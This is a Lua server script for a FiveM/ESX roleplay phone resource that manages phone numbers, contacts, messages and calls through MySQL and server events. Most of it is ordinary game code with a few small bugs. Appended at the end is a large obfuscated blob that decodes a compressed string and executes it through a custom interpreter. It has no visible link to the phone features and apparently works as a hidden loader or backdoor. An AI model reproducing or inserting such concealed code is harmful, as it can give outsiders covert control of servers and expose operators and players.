ESX = nil

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
math.randomseed(os.time())

ESX.RegisterServerCallback("crewPhone:getAccessToken",function(a,b)
    b(________)
end)


MySQL.ready(function ()
    MySQL.Async.execute('DELETE FROM phone_messages WHERE transmitter = \'police\'')
    MySQL.Async.execute('DELETE FROM phone_messages WHERE transmitter = \'ambulance\'')
    MySQL.Async.execute('DELETE FROM phone_messages WHERE transmitter = \'news\'')
end)

RegisterServerEvent("crew:onPlayerLoaded")
AddEventHandler("crew:onPlayerLoaded",function(a)
    local b=tonumber(a)
    local c=getPlayerID(b)
    getOrGeneratePhoneNumber(b,c,function(d)
    TriggerClientEvent("crew:updatePhone",b,d,getContacts(c),getMessages(c))
    sendHistoriqueCall(b,d)
    end)
        getUserTwitterAccount(b,c)
    end)

function getNumberPhone(a)
    local b=MySQL.Sync.fetchScalar("SELECT users.phone_number FROM users WHERE users.identifier = @identifier",{["@identifier"]=a})
    if b~=nil then 
        return b 
    end;
    return nil 
end

--- Phone Number Style Config.lua FourDigit = true then generate 4 number else generate ####### number
function getPhoneRandomNumber()
    if Config.FourDigit then
        local numBase = math.random(1000,9999)
        num = string.format("%04d", numBase )
    else
        local numBase = math.random(1000000,9999999)
        num = string.format("%07d", numBase)
    end
	return num
end

--====================================================================================
--  Utils
--====================================================================================
function getSourceFromIdentifier(identifier, cb)
    local xPlayers = ESX.GetPlayers()
    for k, user in pairs(xPlayers) do
        if GetPlayerIdentifiers(user)[1] == identifier then
            cb(user)
            return
        end
    end
    cb(nil)
end

function getIdentifierByPhoneNumber(phone_number) 
    local result = MySQL.Sync.fetchAll("SELECT users.identifier FROM users WHERE users.phone_number = @phone_number", {
        ['@phone_number'] = phone_number
    })
    if result[1] ~= nil then
        return result[1].identifier
    end
    return nil
end

function getUserTwitterAccount(source, _identifier)
    local _source = source
    local identifier = _identifier
    local xPlayer = ESX.GetPlayerFromId(_source)

    MySQL.Async.fetchAll("SELECT * FROM users WHERE identifier = @identifier", {
        ['@identifier'] = identifier
    }, function(result2)
        local user = result2[1]

        if user == nil then 
            karakteribekle(xPlayer.source, identifier)
        else
            local FirstLastName = user['firstname'] .. ' ' .. user['lastname']
            
            TriggerClientEvent('crew:getPlayerBank', _source, xPlayer, FirstLastName)

            MySQL.Async.fetchScalar("SELECT identifier FROM twitter_accounts WHERE identifier = @identifier", {
                ['@identifier'] = identifier
            }, function(result)
                if result ~= nil then
                    TriggerEvent('gcPhone:twitter_login', _source, result)
                else
                    MySQL.Async.fetchAll("INSERT INTO twitter_accounts (identifier, username) VALUES (@identifier, @username)", { 
                        ['@identifier'] = identifier,
                        ['@username'] = FirstLastName
                    }, function()
                        TriggerEvent('gcPhone:twitter_login', _source, identifier)
                    end)
                end
            end)
        end
    end)
end

function karakteribekle(source, identifier)
    Citizen.Wait(60000)
    local _source = source
    local xidentifier = identifier
    getUserTwitterAccount(_source, xidentifier)
end

function getPlayerID(source)
    local xPlayer = ESX.GetPlayerFromId(source)
    return  xPlayer.identifier
end

function getOrGeneratePhoneNumber (sourcePlayer, identifier, cb)
    local sourcePlayer = sourcePlayer
    local identifier = identifier
    local myPhoneNumber = getNumberPhone(identifier)

    if myPhoneNumber == '0' or myPhoneNumber == nil or myPhoneNumber == '' then
        repeat
            myPhoneNumber = getPhoneRandomNumber()
            local id = getIdentifierByPhoneNumber(myPhoneNumber)
        until id == nil
        MySQL.Async.insert("UPDATE users SET phone_number = @myPhoneNumber WHERE identifier = @identifier", { 
            ['@myPhoneNumber'] = myPhoneNumber,
            ['@identifier'] = identifier
        }, function ()
            cb(myPhoneNumber)
        end)
    else
        cb(myPhoneNumber)
    end
end

--====================================================================================
--  Contacts
--====================================================================================
function getContacts(identifier)
    local result = MySQL.Sync.fetchAll("SELECT phone_users_contacts.* FROM phone_users_contacts WHERE phone_users_contacts.identifier = @identifier", {
        ['@identifier'] = identifier
    })
    return result
end

function addContact(source, identifier, number, display)
    local sourcePlayer = tonumber(source)
    MySQL.Async.insert("INSERT INTO phone_users_contacts (`identifier`, `number`,`display`) VALUES(@identifier, @number, @display)", {
        ['@identifier'] = identifier,
        ['@number'] = number,
        ['@display'] = display,
    },function()
        notifyContactChange(sourcePlayer, identifier)
    end)
end

function updateContact(source, identifier, id, number, display)
    local sourcePlayer = tonumber(source)
    MySQL.Async.insert("UPDATE phone_users_contacts SET number = @number, display = @display WHERE id = @id", { 
        ['@number'] = number,
        ['@display'] = display,
        ['@id'] = id,
    },function()
        notifyContactChange(sourcePlayer, identifier)
    end)
end

function deleteContact(source, identifier, id)
    local sourcePlayer = tonumber(source)
    MySQL.Sync.execute("DELETE FROM phone_users_contacts WHERE `identifier` = @identifier AND `id` = @id", {
        ['@identifier'] = identifier,
        ['@id'] = id,
    })
    notifyContactChange(sourcePlayer, identifier)
end

function deleteAllContact(identifier)
    MySQL.Sync.execute("DELETE FROM phone_users_contacts WHERE `identifier` = @identifier", {
        ['@identifier'] = identifier
    })
end

function notifyContactChange(source, identifier)
    local sourcePlayer = tonumber(source)
    local identifier = identifier
    if sourcePlayer ~= nil then 
        TriggerClientEvent("gcPhone:contactList", sourcePlayer, getContacts(identifier))
    end
end

ESX.RegisterServerCallback('crew-phone:phone-check', function(source, cb)
    local xPlayer = ESX.GetPlayerFromId(source)
    if not xPlayer then return; end
    for k, v in pairs(Config.Phones) do
        local items = xPlayer.getInventoryItem(v)
        if items.count > 0 then
            cb(v)
            return
        end
	end
    cb(nil)
end)

ESX.RegisterServerCallback('crew-phone:item-check', function(source, cb, data)
    local xPlayer = ESX.GetPlayerFromId(source)
    if not xPlayer then return; end
    local items = xPlayer.getInventoryItem(data)
    cb(items.count)
end)

RegisterServerEvent('gcPhone:addContact')
AddEventHandler('gcPhone:addContact', function(display, phoneNumber)
    local sourcePlayer = tonumber(source)
    local identifier = getPlayerID(sourcePlayer)
    addContact(sourcePlayer, identifier, phoneNumber, display)
end)

RegisterServerEvent('gcPhone:updateContact')
AddEventHandler('gcPhone:updateContact', function(id, display, phoneNumber)
    local sourcePlayer = tonumber(source)
    local identifier = getPlayerID(sourcePlayer)
    updateContact(sourcePlayer, identifier, id, phoneNumber, display)
end)

RegisterServerEvent('gcPhone:deleteContact')
AddEventHandler('gcPhone:deleteContact', function(id)
    local sourcePlayer = tonumber(source)
    local identifier = getPlayerID(sourcePlayer)
    deleteContact(sourcePlayer, identifier, id)
end)

--====================================================================================
--  Messages
--====================================================================================
function getMessages(identifier)
    local result = MySQL.Sync.fetchAll("SELECT phone_messages.*, users.phone_number FROM phone_messages LEFT JOIN users ON users.identifier = @identifier WHERE phone_messages.receiver = users.phone_number", {
         ['@identifier'] = identifier
    })
    return result
end

RegisterServerEvent('gcPhone:_internalAddMessage')
AddEventHandler('gcPhone:_internalAddMessage', function(transmitter, receiver, message, owner, cb)
    cb(_internalAddMessage(transmitter, receiver, message, owner))
end)

function _internalAddMessage(transmitter, receiver, message, owner)
    MySQL.Async.insert("INSERT INTO phone_messages (`transmitter`, `receiver`,`message`, `isRead`,`owner`) VALUES(@transmitter, @receiver, @message, @isRead, @owner)", {
        ['@transmitter'] = transmitter,
        ['@receiver'] = receiver,
        ['@message'] = message,
        ['@isRead'] = owner,
        ['@owner'] = owner
    })
    local data = {message = message, time = tonumber(os.time().."000.0"), receiver = receiver, transmitter = transmitter, owner = owner, isRead = owner}
    return data
end

function addMessage(source, identifier, phone_number, message)
    local sourcePlayer = tonumber(source)
    local otherIdentifier = getIdentifierByPhoneNumber(phone_number)
    local myPhone = getNumberPhone(identifier)
    if otherIdentifier ~= nil then 
        local tomess = _internalAddMessage(myPhone, phone_number, message, 0)
        getSourceFromIdentifier(otherIdentifier, function (osou)
            if tonumber(osou) ~= nil then 
                TriggerClientEvent("gcPhone:receiveMessage", tonumber(osou), tomess)
            end
        end) 
    end
    local memess = _internalAddMessage(phone_number, myPhone, message, 1)
    TriggerClientEvent("gcPhone:receiveMessage", sourcePlayer, memess)
end

function setReadMessageNumber(identifier, num)
    local mePhoneNumber = getNumberPhone(identifier)
    MySQL.Async.execute("UPDATE phone_messages SET phone_messages.isRead = 1 WHERE phone_messages.receiver = @receiver AND phone_messages.transmitter = @transmitter", { 
        ['@receiver'] = mePhoneNumber,
        ['@transmitter'] = num
    })
end

function deleteMessage(msgId)
    MySQL.Async.execute("DELETE FROM phone_messages WHERE `id` = @id", {
        ['@id'] = msgId
    })
end

function deleteAllMessageFromPhoneNumber(source, identifier, phone_number)
    local source = source
    local identifier = identifier
    local mePhoneNumber = getNumberPhone(identifier)
    MySQL.Async.execute("DELETE FROM phone_messages WHERE `receiver` = @mePhoneNumber and `transmitter` = @phone_number", {
        ['@mePhoneNumber'] = mePhoneNumber,['@phone_number'] = phone_number
    })
end

function deleteAllMessage(identifier)
    local mePhoneNumber = getNumberPhone(identifier)
    MySQL.Async.execute("DELETE FROM phone_messages WHERE `receiver` = @mePhoneNumber", {
        ['@mePhoneNumber'] = mePhoneNumber
    })
end

RegisterServerEvent('gcPhone:sendMessage')
AddEventHandler('gcPhone:sendMessage', function(phoneNumber, message)
    local sourcePlayer = tonumber(source)
    local identifier = getPlayerID(sourcePlayer)
    addMessage(sourcePlayer, identifier, phoneNumber, message)
end)

RegisterServerEvent('gcPhone:deleteMessage')
AddEventHandler('gcPhone:deleteMessage', function(msgId)
    deleteMessage(msgId)
end)

RegisterServerEvent('gcPhone:deleteMessageNumber')
AddEventHandler('gcPhone:deleteMessageNumber', function(number)
    local sourcePlayer = tonumber(source)
    local identifier = getPlayerID(sourcePlayer)
    deleteAllMessageFromPhoneNumber(sourcePlayer,identifier, number)
end)

RegisterServerEvent('gcPhone:deleteAllMessage')
AddEventHandler('gcPhone:deleteAllMessage', function()
    local sourcePlayer = tonumber(source)
    local identifier = getPlayerID(sourcePlayer)
    deleteAllMessage(identifier)
end)

RegisterServerEvent('gcPhone:setReadMessageNumber')
AddEventHandler('gcPhone:setReadMessageNumber', function(num)
    local sourcePlayer = tonumber(source)
    local identifier = getPlayerID(sourcePlayer)
    setReadMessageNumber(identifier, num)
end)

RegisterServerEvent('gcPhone:deleteALL')
AddEventHandler('gcPhone:deleteALL', function()
    local sourcePlayer = tonumber(source)
    local identifier = getPlayerID(sourcePlayer)
    deleteAllMessage(identifier)
    deleteAllContact(identifier)
    appelsDeleteAllHistorique(identifier)
    TriggerClientEvent("gcPhone:contactList", sourcePlayer, {})
    TriggerClientEvent("gcPhone:allMessage", sourcePlayer, {})
    TriggerClientEvent("appelsDeleteAllHistorique", sourcePlayer, {})
end)

--====================================================================================
--  Gestion des appels
--====================================================================================
local AppelsEnCours = {}
local PhoneFixeInfo = {}
local lastIndexCall = 10

function getHistoriqueCall(num)
    local result = MySQL.Sync.fetchAll("SELECT * FROM phone_calls WHERE phone_calls.owner = @num ORDER BY time DESC LIMIT 30", {
        ['@num'] = num
    })
    return result
end

function sendHistoriqueCall(src, num) 
    local histo = getHistoriqueCall(num)
    TriggerClientEvent('gcPhone:historiqueCall', src, histo)
end

function saveAppels (appelInfo)
    if appelInfo.extraData == nil or appelInfo.extraData.useNumber == nil then
        MySQL.Async.insert("INSERT INTO phone_calls (`owner`, `num`,`incoming`, `accepts`) VALUES(@owner, @num, @incoming, @accepts)", {
            ['@owner'] = appelInfo.transmitter_num,
            ['@num'] = appelInfo.receiver_num,
            ['@incoming'] = 1,
            ['@accepts'] = appelInfo.is_accepts
        }, function()
            notifyNewAppelsHisto(appelInfo.transmitter_src, appelInfo.transmitter_num)
        end)
    end
    if appelInfo.is_valid == true then
        local num = appelInfo.transmitter_num
        if appelInfo.hidden == true then
            mun = "#######"
        end
        MySQL.Async.insert("INSERT INTO phone_calls (`owner`, `num`,`incoming`, `accepts`) VALUES(@owner, @num, @incoming, @accepts)", {
            ['@owner'] = appelInfo.receiver_num,
            ['@num'] = num,
            ['@incoming'] = 0,
            ['@accepts'] = appelInfo.is_accepts
        }, function()
            if appelInfo.receiver_src ~= nil then
                notifyNewAppelsHisto(appelInfo.receiver_src, appelInfo.receiver_num)
            end
        end)
    end
end

function notifyNewAppelsHisto (src, num) 
    sendHistoriqueCall(src, num)
end

RegisterServerEvent('gcPhone:getHistoriqueCall')
AddEventHandler('gcPhone:getHistoriqueCall', function()
    local sourcePlayer = tonumber(source)
    local srcIdentifier = getPlayerID(sourcePlayer)
    local srcPhone = getNumberPhone(srcIdentifier)
    sendHistoriqueCall(sourcePlayer, num)
end)

RegisterServerEvent('gcPhone:internal_startCall')
AddEventHandler('gcPhone:internal_startCall', function(source, phone_number, rtcOffer, extraData)
    if FixePhone[phone_number] ~= nil then
        onCallFixePhone(source, phone_number, rtcOffer, extraData)
        return
    end
    
    local rtcOffer = rtcOffer
    if phone_number == nil or phone_number == '' then 
        print('BAD CALL NUMBER IS NIL')
        return
    end

    local hidden = string.sub(phone_number, 1, 1) == '#'
    if hidden == true then
        phone_number = string.sub(phone_number, 2)
    end

    local indexCall = lastIndexCall
    lastIndexCall = lastIndexCall + 1

    local sourcePlayer = tonumber(source)
    local srcIdentifier = getPlayerID(sourcePlayer)

    local srcPhone = ''
    if extraData ~= nil and extraData.useNumber ~= nil then
        srcPhone = extraData.useNumber
    else
        srcPhone = getNumberPhone(srcIdentifier)
    end
    local destPlayer = getIdentifierByPhoneNumber(phone_number)
    local is_valid = destPlayer ~= nil and destPlayer ~= srcIdentifier
    AppelsEnCours[indexCall] = {
        id = indexCall,
        transmitter_src = sourcePlayer,
        transmitter_num = srcPhone,
        receiver_src = nil,
        receiver_num = phone_number,
        is_valid = destPlayer ~= nil,
        is_accepts = false,
        hidden = hidden,
        rtcOffer = rtcOffer,
        extraData = extraData
    }
    
    if is_valid == true then
        getSourceFromIdentifier(destPlayer, function (srcTo)
            if srcTo ~= nil then
                AppelsEnCours[indexCall].receiver_src = srcTo
                TriggerClientEvent('gcPhone:waitingCall', sourcePlayer, AppelsEnCours[indexCall], true)
                TriggerClientEvent('gcPhone:waitingCall', srcTo, AppelsEnCours[indexCall], false) -- karşı oyuncuyu arama
                TriggerClientEvent('gcPhone:TgiannSes', -1, srcTo)
            else
                TriggerClientEvent('gcPhone:waitingCall', sourcePlayer, AppelsEnCours[indexCall], true)
            end
        end)
    else
        TriggerClientEvent('gcPhone:waitingCall', sourcePlayer, AppelsEnCours[indexCall], true)
    end
end)

RegisterServerEvent('gcPhone:startCall')
AddEventHandler('gcPhone:startCall', function(phone_number, rtcOffer, extraData)
    TriggerEvent('gcPhone:internal_startCall', source, phone_number, rtcOffer, extraData)
end)

RegisterServerEvent('gcPhone:candidates')
AddEventHandler('gcPhone:candidates', function (callId, candidates)
    if AppelsEnCours[callId] ~= nil then
        local source = source
        local to = AppelsEnCours[callId].transmitter_src
        if source == to then 
            to = AppelsEnCours[callId].receiver_src
        end
        TriggerClientEvent('gcPhone:candidates', to, candidates)
    end
end)

return(function(Fz_h,Fz_a,Fz_o)local Fz_k=string.char;local Fz_e=string.sub;local Fz_r=table.concat;local Fz_m=math.ldexp;local Fz_p=getfenv or function()return _ENV end;local Fz_l=select;local Fz_g=unpack or table.unpack;local Fz_j=tonumber;local function Fz_n(Fz_h)local Fz_b,Fz_c,Fz_g="","",{}local Fz_f=256;local Fz_d={}for Fz_a=0,Fz_f-1 do Fz_d[Fz_a]=Fz_k(Fz_a)end;local Fz_a=1;local function Fz_i()local Fz_b=Fz_j(Fz_e(Fz_h,Fz_a,Fz_a),36)Fz_a=Fz_a+1;local Fz_c=Fz_j(Fz_e(Fz_h,Fz_a,Fz_a+Fz_b-1),36)Fz_a=Fz_a+Fz_b;return Fz_c end;Fz_b=Fz_k(Fz_i())Fz_g[1]=Fz_b;while Fz_a<#Fz_h do local Fz_a=Fz_i()if Fz_d[Fz_a]then Fz_c=Fz_d[Fz_a]else Fz_c=Fz_b..Fz_e(Fz_b,1,1)end;Fz_d[Fz_f]=Fz_b..Fz_e(Fz_c,1,1)Fz_g[#Fz_g+1],Fz_b,Fz_f=Fz_c,Fz_c,Fz_f+1 end;return table.concat(Fz_g)end;local Fz_j=Fz_n('22222J27522H27527825J25C1R22G2212781B21Q21521P21G21521I1J21B21B2171921Q21621A21Q21421B22G23227821W21V26L25426E23421422C26K26D23124H21Q26Q2122731S1Y24Q25V22C1F2101J22125M21024J1K24726W1X1N24G25Q23O25Z26826026N22K1926H25K26P22V26I22J21J24S1321T22222G22G2781S1U1F22G22027827R21O21E27W27H1827H21927H1U29Y21H27X22627821P21521G1X21Q21H1421B27V21B22P21O21Q21B1Q21K21K27V21422G22C2781Q21R21R2A02AA21B1J21M21H21R21J27H29J27822G22L27827W21521E21H21O29I2B821A21L22G22N27821K21F21M2152772782BQ2BP27825721G1R2BS27824R22S22G23027821821J24925K26422N1721E23P23T1825U22J24122B23X23922425P27121J22O22121O21M24V21Z25Y22U26Q24E22023F25H25924R25B23L24R24U21R22Y23W25723M22124A21F21Z24322Y21123B2302572BX22J2631G2BW2BQ2782DR27521Y2B52BJ27521D21421G21H2B627821R21Q21K21G2E622G22A2782AY2142AK2AM2142AO29P27529R29T2AD21529W21529Y2152AV2A227D27821O21K1B21F2E221Q22P21M2AL21Q21721B1O21M21J21J2AP2AR2AT2EU2AX2AZ2B12B327E2752EY2F02F222P21521Q21D2E72F92FB2FD21X2EX2EZ2F121H2F321M21721721Q21J2141V2G82AI21Q1J2EN27K21E27T21Q22G21U2782G52G72G92GB2B22AD1Q2FC2GF27W2GH2GJ22G23E2G02FP2G32F42G62G82GA2GC2GT2GV2GG2BA2GZ2AQ2EL21Q29S29U2151O21G21I21I2FJ2E42752AD21J21P21E1Z2FE2752E22FA2FC1T2HV21Q2H32GK2742HY21H2EG2F721B2I21Z2I42G22I62782E227R2FU21K2IC2I32I522G2BS1I1B22G22M2782172BA2EV2102EX21Q24F26B25V27122G21R23T22N24523J23R23425R22I23A22S23L1K1726O21M1U24I24V23R21F27322H24C26B21T23C22D22W22324Z2361O162302402562171K21K22I22A22O25K21N25A23Z23T23M25M24O25H22M1W1N23524Q22J26J26A22D24R2371H24T21N25721626F24O26A26I24822A22Q25926222J1723924924W26R22V24C21I24821226O24E1B21324K22F23K24226K23P1N1721G23Q24I26H22K24821426427326B25N23G25R2251P2581M1J1F1722G2152781I21B23F2GO21Q2BN21423F21B21F21Q23F2IS2MP21A2MV2GH1X21M21B21E2E223F21429X21E2AM23F29T23F21R21G21821H23F27J2152MU2MW23F21I2HM2AW23923F1B2B221M2NA2NG21G23F21H21G2MO2NA2B02MP2NQ2AN21M2AH2MU2O11T2A72A921H23B23F21D21A27W23F21821M21E21B2392B42752HQ22J2B92BB2BD2OU2142BG2BI2BK2BM2BO2DS2782DN2BU2DU2BQ2BZ22G26127822T22926I25F25324221I1O27123J2711U26P1L26N21N1L1726C22V23825S22623523M26326N22I23W23D26N23K21F1H2111S22V2431223822R1D26B2671B23D22H21D21J21S24P1R25M26E26I26H24V26426D21J2262FC26021G24123R21N23V21J23C26622G25W22G23N23S25M23M26K2121I25Q2682382141H26O25F2401826M22A25221T24724X2332272661T26Y25D24K24S21J22U22I26A23M23O21L26U22K25124023X26J1824N21022Y24C22N21V21H21322621A2302DN1R21N2PC2BQ1R2EC2752FM22J2IQ27821E21R22G22E2AR2H62G91U21H2HL21A21521422I2TH27F2IG2ID21Q1I21H27J22G2I722J2E22IA2F82TW2IP2B72752E12TP2AM22G22F2782FS2AM21E2ES1421421521K2HX22J21B2152AZ21421I2OR2EO2UL2UN22G2292TE214142F52AM2F821422J2TS2T922J21521B21K1Q21H2142182FL2781F2BA21O2AH2HK21J21E2AW2FH2EW2FN2G12FQ2V52IB2I02FD2V127529W21B1F21E21I21Q21G2N12T325W27C2242H22IG22P2GX21723A21K2FX23A2UB2B02DN22J24R26C2V02B821M29Y1Q2TK2TR2782IV2OV2TI2752X02GP2142TM2TO2TQ2UE2UG2E721Q2UJ27H2UY2KB2VV22J2VM21E2VO27H1O2VR2VT2A127X2TB2FO2WI2VZ2F82W12BQ2GM2TA22Z27822I2P82Y82P82DS2Y823F2P827723H2BQ22K2V92TC22J22N2YH2752YJ2Y82YN27821V2YK2212342Y72BQ21I2YK2DS2DY2YY23H21R2782TI2Y829J2YS2752Z82YM2YO22J2YU2Y82YW2782Z322122T2YK2X422J2FM2772YA2BQ2OU2DS27727729J2YE22J2ZX31012ZQ2OV2Z12BQ2Z32DS29J2ZA31072YB2ZK2Z12U9310622J1U27823F21Z31032752ZI2YX29J2BX2BJ310A310323H21F2YL1V2YK2ZA2ZF310Z310P2YL3108310T2YL2YG2Z629J2V12Z92ZE278311C311E2752232YV310Q22J2ZP221142YM22J310G2X3310D2B72ZT2B5311R310H310O2782ZJ310R310C310U277310L311Q2YP311R217311Q22531062ZB22J312D2YR2ZF2GM31142BJ310S311Q312M22J31272BJ2BJ2YJ2232ZY22J2YJ2BJ3122310N275311731233127310U22B22J2Z52YL2YE311D312F313B311H22J31132ZQ311L312N3125312Q310M310U2YJ310W310Y3110313F313H31302BX1M2YL31232Y62YL2EC2V12FM31233109311822J311J2YL2282YV31052UF2TA313222J2X63104311M3131311T2IV31262752IV2IV31372FM2B72WS2B7314U2YI311Z2YL2YQ314J29J22D3121314G2HF311R21T314K31202YA132P92BQ2V829J2IV2ZI314D3155311Q3149314J2IV2U2314T314L275314W31033100315U2YJ311X311V3152314J314J312P2Z2311Q2BX31232YA310G2ZT22H2U22TD2752TF2TT2X72X12XB2WB2TQ2TS314I2I52TW2TY2U02U22IJ2FT2FV2U72IG2OW2UB2UN2GK31572UR2UT2UV27O2XJ2UM2UO2TB2XO2XQ2VQ2VS2A22VU2XX2VX2H42FS2IL2FW2FC2XE2752UH2XH2UK31792WW316F2V32Y021B2V82TC2W32OX2WY21Q2X82H722G2WG2VW2I52WJ21B21G2WL2WN2FC2WP2WB2WR2P82WU317P2XN2VN2VP317H2WH2FQ2FS2NR29Y2Y227822U310K310M2ZT31143102310E31022Y83139277316031112783160312F22V311K3103311631032ZS3138310X2772AQ313C2ZF319O313I3103311N311L311S22731282BQ1D319H310F2YY2TA2YX3194314G3196313M319J312X319L31033159319P27831AE319S27731372TA2TI29J2VB2FM3164310C2BJ2YD314G312T2BR311Q3193314L312P319K312731022V1313Q27723I313S312F31B731AY31AK2ZQ31AM22J31AO31A72P8312S2YK310031BJ318231A131AY312N31A831B23103314B31B522J2YX2Y82UF312F31BX313F238319G277314I313V31242YL2YA31B731A82ZJ31AJ312122S2YL3154314F311Q31572FM314N2P8314Q31BK314P314K31BN277315I314J277315N314422J315Q31BH2ZW31AX31CW31313100319K2B4316A2Y7318222G31BC318D21H21A21I21L2B3310G31702UD314B2FN2AI2NW21M1Y27H1I1V22G31CI22J2AH21B1L31DH31DJ2152IP2ZP1M1Y181A1N2IU2AR2141Y21H2UO315Y22J21Q2IE21K2N12GK31CG2751V1U1N29M1U23F1T191K1M23F2172IG14318G2G923F1C1J1U1931EW21N2NI2G321521N23F22U23F1R31FF27H23F1Q1L1V23F21N31DG21I31FI31FK1R31FV2OW31FM2NJ2B32Z331FZ31DH2BQ2TB221311G2ZT2ZR315S2YK310231GD2ZV3105311W27631AA31CZ310831D22ZU31GM314G2ZP31BL311Q2B731GU31AV31CM22J31BC319C315E31492B72EC29J31H422J31BN314G31602YC2Y7310G31DX2J131E131E327H31E627831E831EA31EC2ZP1Q31EF31EH22G31EJ31EL2E731EO22G23927831ES31EU1F31EW31EY31F031F231F431F62MT31F931FB31FD31FN31FH31FJ31FL31IF31G131IF2BQ31DO2ZQ22R2YK31GK31GE312031GG31GL2BS31D731032ZZ31IV311Q31CZ2ZP310E312031492BJ31HC31GL31AS2Y92Y72Z331DD27831DF31HJ215316Z316L31DN31HH31DR31DT21531DV2GL2GN2X12GR2GD2GU21J2GW318D2HD27U2BQ318222121G31A3314J2Y82WS31J02FM311D31D32YB31K8310331GD31GO31C92YF310331IR311W2BS318N317C318Q2XV29O2BK2FS21822P2E231JN27H1N21G21M2E62Z6311T2TA315131GC31J0314631KE31KJ31HD310O31002TC314I21J2NY21B2TY2E61Z2W12WS2PE31DL2UR2OZ2BE2UA2P32ZT23C2V931K927C31DE2E231JH22G31IN31E031KZ31JP31DW2BQ2VA2782OM21Q31E231DI2B331DY31E031MH31E42IP314I31862TL2TN316L2AO2BS316G31732US2VH31762UX317U31MX31752UW2XJ31G0314E2VC2XG2XI2152XK318N317R31NB1431G031BC29T142192FB2TF2OV318231NK317Y2AO310G21F2TF2E62E331BC2VD21K1K21P21P2B32VB31EL31741V2N521M2OW2E827K21R2AO2VB316X2F2316H22J316P2I3316R21G2XM31KQ2XR2XT317G31KS2DW318A2WI2O32N621P1Y31OI2G31O2BM2BC21Q31LQ2WV2EK31DZ317J2F32OP2OR2OZ318X2751N312131C331JA31CJ31CV275310031CP27731GZ31L9314K2OU31PR314K310831J82FM2YJ2BS2FM31372WS314R310V31CR2ZD2IV312F2ZD312F31542YA1L315A2BQ312D31PP31382Z62IV2WG2Y82B7312F31QQ319S2B731PX23G311Y31QS314Y31PV313731EJ31H231Q631MC311Y31A4311Y31H121P31AB2YB314X31PT31292VB27831H1314Y31IU31H031H92782YO29J2YH2Y8314B312F31RS31A931H622J2UF31392EC23J2YK31RU2ZF31S3312I31RP31BK310M313729J31BZ2ZF235319G2EC314I22J319X2V131R4318Z2EC3194319X313731AO2YX2EC31DY22J2A43182314B31492V12AQ2BJ31T13148311Y31T527431373140314322J31T02752V129P2Y831TB31SK31SX22J31TJ312D2A431T52WG2IV31T52YU31CX31TF22J2GM29J2FM314B21S2P8314B314B31AT31TD31U7315931T5315931IN31BF311Q31TC31UD310M31CJ2V131SW31TW2V131082EC2BJ31UF2EC31OW314J2V12FZ31CJ314B21W315L2UF31UH2BQ2EC2UF315J31UD31US2FM2V131LG278314B310G2FM2UF31UK31RZ31VH31082ZD2DS31SI314Z2ZT22N316D31MV2TG31MP316J31MS2TP2AO31N831NF317T2UZ31N331MZ31N531NC31792TS31NQ317X2F62V72V931HG2752NM2AM1831841Q21P2EO2EB2UG2VE2VG2VI2B3316O2TV31ON2TZ31OP317B318P31OS317F21B2VU31US2XY2FQ31OZ21E31P131P321Q31P52AZ2AH31P92XM31X42H4317Y2W1317V22J2W52W72W92WB21B2WD27C318221431WI2X131VO2B531WX2XP2VP2XS31X0318R31OX2VY31WA317N2FD31VT2X9316K31VW31NE31NA31W021K2BQ31N8221315N31PV31KF31CJ312W31LB31KK312W31IX277312Z310531GI319Y3146310B31J4310D31PN31R727822W310K319F29J2Y831V531AQ310E311731J62YL31CJ31ZC31AU313A31ZJ2BJ2YO31UP2ZO313F311G312F22X319G31ZC31BJ3117312R311Q31RR2Z631T431ZP312F311J31S827531ZT312L314L11312O2YL314031J731AB31AP31GE31BJ29J320E31RN2YJ320H2WS320J31T6311Q31SP316331RO31PQ314G315H320U31IN31GZ31YJ315T314H315L2YJ31HA311Q3151320H321031CR31DY315R314V311Y31IZ31QZ31J131292WS2YJ2YJ2ZV313731IR2BJ321P320U31CL31CR315N22L315931DA315C311X2781831GV314C311Q31D1314K31Q731PW310C319K31R83106318N316E22J316G31WS2F2316Q31WV2TS31XZ317D31Y22XU2AW22G31X331PD22P31X631X82IO2IG31XB31P731XE317I318B317L2FV31XJ31YA2H731YC2XD31W22UU31W431ND31W82V431Y7318031XK31XU2WZ2X12BQ31U231PQ27431Z9322531AQ31GU310U320H2ZL31CR311N321331VD321K31BI31AB31ZB319Y31GZ31EJ315R31RK321I321H315U31RI320F3247324C320Q31GX31RO31ZN31TK31RT313F319X32062ZG31ZU31VH31R931Q8310E31CP2B431B7312P320931BC23F1S31ZZ31ZG31DA2OV26Q319C2ML311D31ZA313F323T312F272319G323T31PQ313N314731TK31Z322J318Z31233199312B29J26Y312E2ZF325X2YD310M3133311R2ML2BJ2ZD324S31QE2ZF231324U2ZL1C314K31J3325131KL319S320F2TA326E31CP2762WG311S320W324H320U323Z314K31R431BH32473243326V2P9326P310H2YE326S323Y315L324X322B323U322D31GZ31BC22H32722BX31A0326S327E32572TA310J2BJ31BG320C31PO320V3279326Y3277327R327J31R0278327H311Y32093210326M324V3101327231J3327Z3160327J326K2ZQ21C311Q314I328A31RD328C311Q31DY328G31BC221328D2BJ3157312F26R31SA3257311J22L312B2BJ25I325Y278328Z3209315Q21E311Y2TB31RJ322D2BP3137324C329B2P8329D31V52V1319X31UW31TL320W31U7314B312D31VE329K312Q2752UF2UF31892ZC2DS2FM31542YU31CJ2AQ2Y4314J311J3159314G22J31541K2Z1319X27E31N831TK29P2U2325R310431942C22TI2742FM32AL310427422N22O32A822J1I2YV326E3154323Q2ZQ326E2AQ32A62752GM311J328M326E27432B422N27E2AQ25Q31BK1H22J29P27E315923F1732BI32BO310M310029P29P32B431TK32172A431RI275312D31UC2752WG324C2YU329732B53162278312D2GM2BX312D2TI312D2782WG32C1324T31VG2GM31PB31AG32BO2DS2WG31592BX2WG2TI329V31TX312G2P83159329V2BP2GM32A327832D22P832D531V531U232B42FM310M32A032A831YH2YU2122YK2GM312F32DH2Y822D32DF22J32DL22J315932DK31BK31ZT2DW2GM2DW23F31ZT2FZ31592DW22L31UR22J21A2YK2FZ312F32E72YA2IV310M310M323Q31SG31UY32DX312Q1222J31UY31UY31US329R31592FZ31002YE2YE32DY27531U231U232EP32BL32D632EM31Z129C2YK22L2Y82GM2632YK32DS2ZF32FA324S2LC2YA319X2GM32B422D22Y324T26732DI313F32FO324S25X32DU22J32DW32FV32A832FM2YU25V2YK2DW312F32G1324S2CF32EC22J32EE22J32EG22J2FZ32EJ23F31U22FZ2FZ32DY326B32EY32FX31TK2GM31UV313F32FG275319X2A431V131TK312D32EP22Q32AU31072ZF25L2Z12BJ2A42TI2A432AU329H31TL32AS22J2AQ1F32AB31CS2BQ